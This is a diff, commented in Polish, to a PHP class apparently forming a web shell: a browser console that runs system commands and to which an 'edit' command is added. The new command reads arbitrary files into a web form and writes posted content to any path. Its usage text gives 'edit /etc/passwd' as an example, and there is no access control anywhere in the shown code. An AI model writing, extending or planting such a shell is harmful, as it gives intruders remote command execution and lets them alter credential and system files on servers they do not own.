@@ -36,6 +36,7 @@ class Shell
 	const HELP = '
 help - Wyświetlanie pomocy
 modules - Informacje o modułach
+edit - Edycja oraz tworzenie nowego pliku
 system, exec - Uruchomienie polecenia systemowego
 info - Wyświetla informacje o systemie';
 
@@ -712,13 +713,52 @@ DATA;
 	}
 
 	/**
+	 * Edycja pliku
+	 *
+	 * @access public
+	 * @param  string         $sCmd Sciezka do pliku
+	 * @return string|boolean
+	 */
+	public function getCommandEdit( $sFile )
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<DATA
+edit - Edycja oraz tworzenie nowego pliku
+
+	Użycie:
+		edit /etc/passwd
+		edit /sciezka/do/nowego/pliu
+DATA;
+		}
+
+		/**
+		 * Zapis do pliku
+		 */
+		if( ( $sFiledata = Request::getPost( 'filedata' ) ) !== FALSE )
+		{
+			return (boolean) file_put_contents( $sFile, $sFiledata );
+		}
+
+		/**
+		 * Formularz
+		 */
+		return sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
+			sprintf( '<textarea id="console" name="filedata">%s</textarea><div>', ( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ) ) .
+			sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( Request::getPost( 'cmd' ) ) ) .
+			'<input type="submit" name="submit" value="Zapisz" id="cmd-send" /></form></div>';
+	}
+
+	/**
 	 * Wykonanie polecenia systemowago
 	 *
 	 * @access public
 	 * @param  string $sCmd Komenda
 	 * @return string
 	 */
-
 	private function getCommandInfo()
 	{
 		/**
@@ -762,6 +802,17 @@ DATA;
 	public function getActionBrowser( $sCmd = NULL )
 	{
 		$bRaw = ( $sCmd !== NULL );
+
+		/**
+		 * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
+		 * linia polecen i przycisk 'Execute'
+		 */
+		$bOwnContent = FALSE;
+
+		/**
+		 * Zawartosc strony
+		 */
+		$sContent = NULL;
 
 		/**
 		 * Zawartosc konsoli
@@ -857,6 +908,29 @@ DATA;
 				case 'info':
 					$sConsole = $this -> getCommandInfo();
 					break ;
+				case 'edit':
+					$mContent = $this -> getCommandEdit( $this -> sArgv );
+
+					if( is_bool( $mContent ) )
+					{
+						$sConsole = sprintf( 'Plik %szostał zapisany', ( ! $mContent ? 'nie ' : NULL ) );
+					}
+					/**
+					 * Help
+					 */
+					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
+					{
+						$sConsole = $mContent;
+					}
+					/**
+					 * Formularz sluzacy do edycji pliku
+					 */
+					else
+					{
+						$bOwnContent = TRUE;
+						$sContent = $mContent;
+					}
+					break ;
 				default :
 					if( $this -> aModules === array() )
 					{
@@ -899,10 +973,16 @@ DATA;
 			return htmlspecialchars_decode( $sConsole ) . "\r\n";
 		}
 
-		$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
-		             sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
-			     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
+		/**
+		 * Wlasna zawartosc okna
+		 */
+		if( ! $bOwnContent )
+		{
+			$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
+				     sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
+				     sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
+				     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
+		}
 
 		return $this -> getContent( $sContent );
 	}
@@ -962,7 +1042,8 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 		}
 
 		/**
-		 * @todo - Tutaj ma byc edycja pliku
+		 * Strasznie duzo jest kodu, wygodniej jest rozdzielic
+		 * to na inne metody
 		 */
 		echo $this -> getActionBrowser();
 	}
